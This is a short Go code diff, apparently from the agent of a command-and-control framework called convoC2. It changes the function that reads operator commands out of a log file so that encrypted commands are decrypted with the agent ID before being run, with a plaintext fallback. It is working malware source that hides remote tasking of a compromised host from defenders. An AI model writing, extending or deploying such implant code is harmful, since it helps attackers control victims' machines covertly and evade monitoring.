@@ -6,6 +6,8 @@ import (
 	"os"
 	"os/exec"
 	"regexp"
+
+	"github.com/cxnturi0n/convoC2/pkg/crypto"
 )
 
 type CommandOutput struct {
@@ -38,12 +40,20 @@ func execCommand(command string) CommandOutput {
 	return result
 }
 
-func readCommand(logFileAsString string, commandRegex *regexp.Regexp) (command string) {
-
+func readCommand(logFileAsString string, commandRegex *regexp.Regexp, agentID string) (command string) {
 	match := commandRegex.FindStringSubmatch(logFileAsString)
 
 	if len(match) > 1 {
-		command = match[1]
+		encryptedCommand := match[1]
+
+		// Try to decrypt - handle both encrypted and plaintext commands
+		decrypted, err := crypto.Decrypt(encryptedCommand, agentID)
+		if err == nil {
+			command = decrypted
+		} else {
+			// Fallback to treating as plaintext (for backward compatibility)
+			command = encryptedCommand
+		}
 	}
 
 	return command
